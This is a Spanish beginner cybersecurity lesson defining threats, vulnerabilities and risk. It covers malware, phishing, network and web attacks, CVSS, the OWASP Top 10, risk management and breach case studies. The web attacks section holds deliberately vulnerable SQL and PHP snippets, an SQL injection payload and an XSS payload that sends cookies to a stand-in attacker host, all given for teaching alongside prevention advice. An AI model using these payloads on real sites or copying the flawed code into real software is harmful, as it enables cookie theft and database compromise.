# 1.3 AMENAZAS, VULNERABILIDADES Y RIESGOS

**Duración**: 45 minutos
**Nivel**: Principiante

---

## 📋 Contenido

1. [Definiciones Fundamentales](#definiciones-fundamentales)
2. [Tipos de Amenazas](#tipos-de-amenazas)
3. [Vulnerabilidades Comunes](#vulnerabilidades-comunes)
4. [Gestión de Riesgos](#gestión-de-riesgos)
5. [Casos Prácticos](#casos-prácticos)

---

## Definiciones Fundamentales

### Amenaza (Threat)
Una **amenaza** es cualquier circunstancia o evento con el potencial de causar daño a un sistema o red a través de acceso no autorizado, destrucción, divulgación, modificación de datos o denegación de servicio.

**Características**:
- Puede ser intencional (ataque dirigido) o accidental (error humano)
- Puede venir de fuentes externas o internas
- Requiere de una vulnerabilidad para ser explotada

**Ejemplos**:
- Hackers intentando acceder a sistemas
- Malware circulando en Internet
- Empleados descontentos
- Desastres naturales
- Errores de configuración

### Vulnerabilidad (Vulnerability)
Una **vulnerabilidad** es una debilidad en un sistema, aplicación, red o proceso que puede ser explotada por una amenaza para obtener acceso no autorizado o causar daño.

**Características**:
- Puede existir en software, hardware, procesos o personas
- Puede ser conocida (CVE publicado) o desconocida (zero-day)
- Su severidad se mide con sistemas como CVSS

**Ejemplos**:
- Software sin parches actualizados
- Contraseñas débiles
- Puertos abiertos innecesariamente
- Falta de cifrado en comunicaciones
- Configuraciones por defecto no modificadas

### Riesgo (Risk)
El **riesgo** es la probabilidad de que una amenaza explote una vulnerabilidad y cause daño, considerando el impacto potencial.

**Fórmula básica**:
```
Riesgo = Amenaza × Vulnerabilidad × Impacto
```

**Componentes**:
- **Probabilidad**: ¿Qué tan probable es que ocurra?
- **Impacto**: ¿Qué tan grave sería si ocurre?
- **Exposición**: ¿Qué activos están en riesgo?

---

## Tipos de Amenazas

### 1. Malware (Software Malicioso)

#### Virus
Programa que se replica insertándose en otros programas o archivos.

**Características**:
- Requiere acción del usuario para propagarse
- Puede dañar o corromper archivos
- Se adjunta a archivos ejecutables

**Ejemplo histórico**: ILOVEYOU (2000) - Se propagó por email, causó $10 billones en daños.

#### Ransomware
Cifra los archivos de la víctima y exige pago para descifrarlos.

**Características**:
- Altamente lucrativo para atacantes
- Usa criptografía fuerte (AES, RSA)
- A menudo se propaga por phishing o exploits

**Ejemplo reciente**: WannaCry (2017), REvil (2021), LockBit (2023-2024)

**Prevención**:
- Backups offline regulares
- Segmentación de red
- EDR (Endpoint Detection and Response)
- Educación de usuarios

#### Troyanos
Software que aparenta ser legítimo pero contiene funcionalidad maliciosa.

**Tipos**:
- **Backdoor trojans**: Acceso remoto
- **Banking trojans**: Roban credenciales bancarias
- **RAT (Remote Access Trojans)**: Control total del sistema

#### Spyware
Recopila información del usuario sin su consentimiento.

**Objetivos**:
- Credenciales de acceso
- Historial de navegación
- Pulsaciones de teclado (keyloggers)
- Capturas de pantalla

#### Rootkits
Software diseñado para ocultar la presencia de otros malware.

**Niveles**:
- **User-mode**: Nivel de aplicación
- **Kernel-mode**: Nivel del sistema operativo
- **Bootkit**: Nivel de arranque (MBR/UEFI)

### 2. Ataques de Ingeniería Social

#### Phishing
Intento de obtener información sensible haciéndose pasar por entidad legítima.

**Variantes**:
- **Spear phishing**: Dirigido a individuos específicos
- **Whaling**: Dirigido a ejecutivos (CEO, CFO)
- **Vishing**: Phishing por voz (llamadas telefónicas)
- **Smishing**: Phishing por SMS

**Indicadores de phishing**:
- URLs sospechosas (typosquatting)
- Errores ortográficos/gramaticales
- Sentido de urgencia artificial
- Solicitudes inusuales
- Remitente desconocido con solicitudes sensibles

**Ejemplo real**:
```
De: seguridad@bancx.com (FALSO: realmente bancx-seguro.com)
Asunto: ¡URGENTE! Su cuenta será suspendida

Estimado cliente,
Hemos detectado actividad sospechosa. Haga clic aquí
para verificar su identidad en las próximas 24 horas o
su cuenta será bloqueada permanentemente.

[Botón: Verificar Ahora] → Link malicioso
```

#### Pretexting
Crear un escenario falso para obtener información.

**Ejemplo**: Atacante llama haciéndose pasar por soporte técnico.

#### Baiting
Ofrecer algo atractivo para tentar a la víctima.

**Ejemplo**: USB infectado dejado en estacionamiento con etiqueta "Salarios 2024".

#### Tailgating
Seguir a persona autorizada para entrar a área restringida.

### 3. Ataques de Red

#### Man-in-the-Middle (MitM)
Interceptación de comunicaciones entre dos partes.

**Técnicas**:
- **ARP Spoofing**: Envenenamiento de caché ARP
- **DNS Spoofing**: Respuestas DNS falsas
- **SSL Stripping**: Degradar HTTPS a HTTP
- **Rogue Wi-Fi**: Puntos de acceso falsos

**Escenario**:
```
Cliente ←→ Atacante ←→ Servidor
          (intercepta)
```

**Mitigación**:
- Usar VPN en redes públicas
- Verificar certificados SSL/TLS
- HSTS (HTTP Strict Transport Security)
- Certificate pinning

#### Ataques de Fuerza Bruta
Intentos sistemáticos de adivinar credenciales.

**Variantes**:
- **Fuerza bruta simple**: Probar todas las combinaciones
- **Ataque de diccionario**: Usar lista de contraseñas comunes
- **Credential stuffing**: Usar credenciales filtradas
- **Password spraying**: Misma contraseña, múltiples usuarios

**Prevención**:
- Rate limiting (límite de intentos)
- CAPTCHA
- Autenticación multifactor (MFA)
- Políticas de contraseñas fuertes
- Monitoreo de intentos fallidos

#### Distributed Denial of Service (DDoS)
Inundación de tráfico para hacer inaccesible un servicio.

**Tipos**:
- **Volumétricos**: Saturan ancho de banda (UDP flood, DNS amplification)
- **Protocolo**: Explotan debilidades de protocolos (SYN flood)
- **Aplicación**: Atacan capa 7 (HTTP flood)

**Volumen típico**: Ataques modernos > 1 Tbps

**Mitigación**:
- CDN con protección DDoS (Cloudflare, Akamai)
- Rate limiting
- Firewalls de aplicación web (WAF)
- Escalado automático

### 4. Ataques a Aplicaciones Web

#### SQL Injection (SQLi)
Inserción de código SQL malicioso en campos de entrada.

**Ejemplo vulnerable**:
```python
# CÓDIGO VULNERABLE - NO USAR
query = "SELECT * FROM users WHERE username='" + user_input + "'"
```

**Exploit**:
```sql
Input: admin' OR '1'='1
Query resultante: SELECT * FROM users WHERE username='admin' OR '1'='1'
-- Devuelve todos los usuarios
```

**Prevención**:
- Prepared statements / Parametrized queries
- ORM (Object-Relational Mapping)
- Validación de entrada
- Principio de mínimo privilegio en BD

#### Cross-Site Scripting (XSS)
Inyección de scripts maliciosos en páginas web vistas por otros usuarios.

**Tipos**:
- **Reflected XSS**: Script en URL, ejecutado inmediatamente
- **Stored XSS**: Script almacenado en BD, ejecutado posteriormente
- **DOM-based XSS**: Manipulación del DOM en cliente

**Ejemplo**:
```html
<!-- Vulnerable -->
<div>Bienvenido, <?php echo $_GET['nombre']; ?></div>

<!-- Exploit -->
URL: ?nombre=<script>document.location='http://evil.com?cookie='+document.cookie</script>
```

**Prevención**:
- Escapar output (HTML encoding)
- Content Security Policy (CSP)
- Validación de entrada
- HTTPOnly cookies

#### Cross-Site Request Forgery (CSRF)
Forzar a usuario autenticado a ejecutar acciones no deseadas.

**Escenario**:
1. Usuario logueado en banco.com
2. Visita sitio malicioso
3. Sitio malicioso envía petición a banco.com
4. Petición se ejecuta con credenciales del usuario

**Prevención**:
- Tokens CSRF únicos por sesión
- SameSite cookies
- Verificar header Referer
- Re-autenticación para acciones críticas

---

## Vulnerabilidades Comunes

### Sistema CVE (Common Vulnerabilities and Exposures)

Base de datos pública de vulnerabilidades conocidas.

**Formato**: CVE-YYYY-NNNNN
- **YYYY**: Año
- **NNNNN**: Número secuencial

**Ejemplo**: CVE-2021-44228 (Log4Shell)
- Vulnerabilidad crítica en Log4j
- Permitía ejecución remota de código
- Afectó millones de sistemas
- CVSS Score: 10.0 (máximo)

**Recursos**:
- https://cve.mitre.org
- https://nvd.nist.gov

### CVSS (Common Vulnerability Scoring System)

Sistema de puntuación de severidad (0-10).

**Métricas**:
1. **Base**: Características intrínsecas
   - Vector de ataque (red, adyacente, local, físico)
   - Complejidad
   - Privilegios requeridos
   - Interacción del usuario

2. **Temporal**: Cambian en el tiempo
   - Disponibilidad de exploit
   - Nivel de remediación
   - Confianza del reporte

3. **Entorno**: Específicas de la organización
   - Requisitos de confidencialidad
   - Requisitos de integridad
   - Requisitos de disponibilidad

**Clasificación**:
- 0.0: Ninguna
- 0.1-3.9: Baja
- 4.0-6.9: Media
- 7.0-8.9: Alta
- 9.0-10.0: Crítica

### OWASP Top 10 (2021)

Lista de los riesgos de seguridad más críticos en aplicaciones web.

1. **A01:2021 - Broken Access Control**
   - Usuarios pueden acceder a recursos no autorizados
   - Ejemplo: Modificar ID en URL para ver datos de otros

2. **A02:2021 - Cryptographic Failures**
   - Fallas en protección de datos sensibles
   - Ejemplo: Transmisión sin cifrado, algoritmos débiles

3. **A03:2021 - Injection**
   - SQL, NoSQL, OS command, LDAP injection
   - Ejemplo: SQLi visto anteriormente

4. **A04:2021 - Insecure Design**
   - Fallas de diseño fundamental
   - No se puede arreglar solo con implementación

5. **A05:2021 - Security Misconfiguration**
   - Configuraciones por defecto
   - Servicios innecesarios habilitados
   - Mensajes de error detallados en producción

6. **A06:2021 - Vulnerable and Outdated Components**
   - Usar bibliotecas con vulnerabilidades conocidas
   - No actualizar dependencias

7. **A07:2021 - Identification and Authentication Failures**
   - Gestión incorrecta de sesiones
   - Permitir contraseñas débiles
   - No implementar MFA

8. **A08:2021 - Software and Data Integrity Failures**
   - No verificar integridad de actualizaciones
   - Deserialización insegura
   - CI/CD pipelines inseguros

9. **A09:2021 - Security Logging and Monitoring Failures**
   - No registrar eventos de seguridad
   - Logs inadecuados para detección
   - No alertar sobre actividad sospechosa

10. **A10:2021 - Server-Side Request Forgery (SSRF)**
    - Servidor hace peticiones a recursos internos por petición del atacante
    - Puede acceder a metadatos de cloud (AWS, Azure)

### CWE (Common Weakness Enumeration)

Taxonomía de debilidades de software.

**Ejemplos**:
- **CWE-79**: XSS
- **CWE-89**: SQL Injection
- **CWE-20**: Validación de entrada incorrecta
- **CWE-119**: Buffer overflow
- **CWE-200**: Exposición de información sensible

---

## Gestión de Riesgos

### Proceso de Gestión

```
1. IDENTIFICACIÓN → 2. ANÁLISIS → 3. EVALUACIÓN → 4. TRATAMIENTO → 5. MONITOREO
```

### 1. Identificación de Riesgos

**Métodos**:
- Revisión de activos
- Análisis de amenazas
- Escaneo de vulnerabilidades
- Revisiones de código
- Pentesting
- Threat modeling

**Ejemplo de inventario**:
| Activo | Amenaza | Vulnerabilidad |
|--------|---------|----------------|
| Servidor web | DDoS | Sin protección CDN |
| Base de datos | SQLi | Input sin validar |
| Empleados | Phishing | Falta de capacitación |

### 2. Análisis de Riesgos

**Análisis Cualitativo**:
- Bajo, Medio, Alto, Crítico
- Más rápido, menos preciso
- Útil para priorización inicial

**Análisis Cuantitativo**:
- Valores numéricos y monetarios
- Más preciso, requiere más datos

**Métricas**:
- **ALE (Annual Loss Expectancy)**: Pérdida anual esperada
- **ARO (Annual Rate of Occurrence)**: Frecuencia anual
- **SLE (Single Loss Expectancy)**: Pérdida por incidente

```
ALE = SLE × ARO

Ejemplo:
SLE = $50,000 (costo de brecha de datos)
ARO = 0.5 (una vez cada 2 años)
ALE = $50,000 × 0.5 = $25,000/año
```

### 3. Evaluación de Riesgos

**Matriz de Riesgo**:

```
    IMPACTO
    │ Crítico │ ALTO │ ALTO │ CRÍTICO │ CRÍTICO │
    │ Alto    │ MED  │ ALTO │ ALTO    │ CRÍTICO │
P   │ Medio   │ BAJO │ MED  │ ALTO    │ ALTO    │
R   │ Bajo    │ BAJO │ BAJO │ MED     │ ALTO    │
O   │         │ Bajo │ Med  │ Alto    │ Crítico │
B   └─────────┴──────┴──────┴─────────┴─────────
              IMPACTO →
```

**Priorización**:
1. Riesgo CRÍTICO → Atención inmediata
2. Riesgo ALTO → Plan de acción urgente
3. Riesgo MEDIO → Plan de mitigación programado
4. Riesgo BAJO → Aceptar o monitorear

### 4. Tratamiento de Riesgos

**Estrategias**:

#### Mitigar
Reducir probabilidad o impacto.

**Ejemplos**:
- Instalar firewall (reduce probabilidad)
- Implementar backups (reduce impacto)
- Aplicar parches (reduce vulnerabilidad)

#### Transferir
Compartir o trasladar el riesgo a tercero.

**Ejemplos**:
- Seguro de ciberseguridad
- Servicios managed security (MSSP)
- Cloud provider (responsabilidad compartida)

#### Evitar
Eliminar la actividad que causa el riesgo.

**Ejemplos**:
- No almacenar datos de tarjetas (usar tokenización)
- Descontinuar servicio vulnerable
- No permitir acceso remoto

#### Aceptar
Reconocer el riesgo sin tomar acción.

**Cuándo**:
- Costo de mitigación > impacto potencial
- Riesgo muy bajo
- Decisión consciente y documentada

### 5. Monitoreo Continuo

**Actividades**:
- Revisiones periódicas
- Escaneos de vulnerabilidades automatizados
- Auditorías de seguridad
- Pruebas de penetración
- Actualización de matriz de riesgos
- Revisión de nuevas amenazas (threat intelligence)

---

## Casos Prácticos

### Caso 1: Equifax (2017)

**Incidente**:
- Brecha masiva de datos
- 147 millones de personas afectadas
- Exposición de nombres, SSN, fechas de nacimiento, direcciones

**Causa**:
- Vulnerabilidad conocida sin parchear (CVE-2017-5638)
- Apache Struts framework
- Parche disponible 2 meses antes del ataque

**Lecciones**:
- Gestión de parches crítica
- Inventario de activos actualizado
- Monitoreo de CVEs

**Costo**: >$1.4 billones en multas y compensaciones

### Caso 2: SolarWinds (2020)

**Incidente**:
- Supply chain attack
- Compromiso de actualizaciones de software Orion
- Afectó ~18,000 organizaciones (incluyendo gobierno US)

**Técnica**:
- Backdoor "SUNBURST" insertado en actualizaciones legítimas
- Firmado con certificado válido
- Pasó inadvertido por meses

**Lecciones**:
- Verificar integridad de supply chain
- Zero Trust: no confiar ciegamente en actualizaciones
- Segmentación de red
- Detección de anomalías

### Caso 3: Colonial Pipeline (2021)

**Incidente**:
- Ransomware (DarkSide)
- Cierre de oleoducto principal de US East Coast
- Escasez de combustible

**Vector**:
- Credenciales VPN comprometidas (sin MFA)
- Contraseña filtrada en dark web

**Lecciones**:
- MFA obligatorio en accesos críticos
- Segmentación IT/OT
- Plan de respuesta a incidentes
- Backups offline

**Costo**: $4.4 millones en ransom (parcialmente recuperado)

---

## Resumen

### Diferencias Clave

| Concepto | Definición | Ejemplo |
|----------|------------|---------|
| **Amenaza** | Potencial de causar daño | Hacker, malware, inundación |
| **Vulnerabilidad** | Debilidad explotable | Software sin parchear, puerto abierto |
| **Riesgo** | Probabilidad × Impacto | 70% probabilidad × $100k pérdida |

### Ecuación Fundamental

```
Amenaza + Vulnerabilidad = Riesgo
```

Sin vulnerabilidad, la amenaza no puede materializarse.
Sin amenaza, la vulnerabilidad no representa riesgo.

### Mejores Prácticas

1. **Mantén inventario actualizado** de activos y vulnerabilidades
2. **Aplica parches regularmente** (gestión de vulnerabilidades)
3. **Educa a usuarios** (mayor vector: humano)
4. **Implementa defensa en profundidad** (múltiples capas)
5. **Monitorea continuamente** (detección temprana)
6. **Ten plan de respuesta** (cuando, no si, ocurra incidente)
7. **Revisa y actualiza** evaluaciones de riesgo regularmente

---

## Ejercicios de Autoevaluación

### Ejercicio 1: Identificación
Para cada escenario, identifica si es amenaza, vulnerabilidad o riesgo:

1. Un empleado usa contraseña "123456"
2. Un grupo de ransomware conocido
3. 80% probabilidad de phishing exitoso con impacto $50k
4. Puerto SSH expuesto a Internet
5. Competidor intentando robar propiedad intelectual

<details>
<summary>Ver respuestas</summary>

1. Vulnerabilidad
2. Amenaza
3. Riesgo
4. Vulnerabilidad
5. Amenaza
</details>

### Ejercicio 2: Clasificación CVSS
Investiga CVE-2021-44228 (Log4Shell) y responde:
- ¿Qué puntuación CVSS tiene?
- ¿Por qué se considera crítica?
- ¿Qué sistemas afectó?

### Ejercicio 3: Matriz de Riesgo
Crea una matriz de riesgo para tu organización (o una ficticia) con al menos 5 riesgos.

---

## Referencias

- [NIST SP 800-30: Risk Assessment](https://csrc.nist.gov/publications/detail/sp/800-30/rev-1/final)
- [OWASP Top 10](https://owasp.org/Top10/)
- [CVE Database](https://cve.mitre.org/)
- [NVD - National Vulnerability Database](https://nvd.nist.gov/)
- [CVSS Calculator](https://www.first.org/cvss/calculator/3.1)

---

[⬅️ Anterior: Principios Fundamentales](./02_principios_fundamentales.md) | [➡️ Siguiente: Modelos y Marcos](./04_modelos_marcos.md)
